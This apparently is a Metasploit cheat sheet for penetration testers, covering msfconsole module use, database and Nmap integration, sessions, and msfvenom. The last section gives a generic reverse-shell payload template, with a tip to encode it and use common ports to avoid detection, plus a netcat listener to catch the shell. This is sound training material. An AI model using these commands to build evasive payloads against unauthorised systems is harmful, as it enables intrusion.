Overview

Documentation

Modules

TypeDescription
AuxiliaryScanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality.
EncodersEnsure that payloads are intact to their destination.
ExploitsDefined as modules that exploit a vulnerability that will allow for the payload delivery.
NOPs(No Operation code) Keep the payload sizes consistent across exploit attempts.
PayloadsCode runs remotely and calls back to the attacker machine to establish a connection (or shell).
PluginsAdditional scripts can be integrated within an assessment with msfconsole and coexist.
PostWide array of modules to gather information, pivot deeper, etc.

Usage

General commands

Searching for modules :

search -h

Note : Some modules may only be available on Rapid7 github, copy corresponding files to /usr/share/metasploit-framework/modules/exploits to add them to Metasploit.

Use a module :

use <moduleIndexNumber> / <modulePath>

Display module options :

options

Set a parameter / set parameter permanently (until program restart) :

set / setg <parameter> <value>

Get more info about module :

info

Run exploit :

exploit

Note : run exploit -h to get all available options.

Change payload

Once a module has been chosen, display all available payloads :

show payloads

Payloads can be filtered by name :

grep <string1> grep <string2> show payloads

And selected with id :

set payload <id>

Databases

Usage

Creating database

Start PostgreSQL and check its status :

sudo systemctl start postgresql; sudo service postgresql status

Initiate database and check its status :

sudo msfdb init && sudo msfdb status

Connect to initiated database :

sudo msfdb run

Reinitiate the database (if necessary) :

msfdb reinit; cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/; sudo service postgresql restart; msfconsole -q

Interacting from Msfconsole

Get helper :

help database

Check command helper :

<databaseCommand> -h

Note : export database when finishing a session.

Nmap integration

Import Nmap scan results :

db_import nmapScan.xml

Use Nmap from msfconsole :

db_nmap [nmapParameters]

Plugins

Usage

Display available plugins :

ls /usr/share/metasploit-framework/plugins

Note : to add new plugins move the .rb files to /usr/share/metasploit-framework/plugins.

Load plugin :

load <pluginName>

Plugin helper :

help

Sessions and Jobs

Usage

Sessions

Background a session (can also be done with [ctrl] + [z]) :

background

List active sessions :

sessions

Switch to session with session number :

sessions -i <sessionNumber>

Jobs

Jobs helper :

jobs -h

Run exploit as a job :

exploit -j

List running jobs :

jobs -l

MSFVenom

Documentation

Staged vs Stageless payloads

Staged and Stageless payloads can be separated through an naming convention :

  • <generalInformation>/<stage1>/<satage2>

Staged : linux/x86/meterpreter/reverse_tcp Stageless : linux/x86/meterpreter_reverse_tcp

Information can also be found in the description of the payload.

Usage

List all available payloads :

msfvenom -l payloads

List all available options :

msfvenom -h

Create payload (may be useful to add encoding, encryption and use common ports to avoid detection) :

msfvenom -p <payloadName> LHOST=<localIP> LPORT=<port> -f <format> -o <outputFileName>

Listen to specified port, when the file is executed a shell will be caught :

sudo nc -lvnp <port>
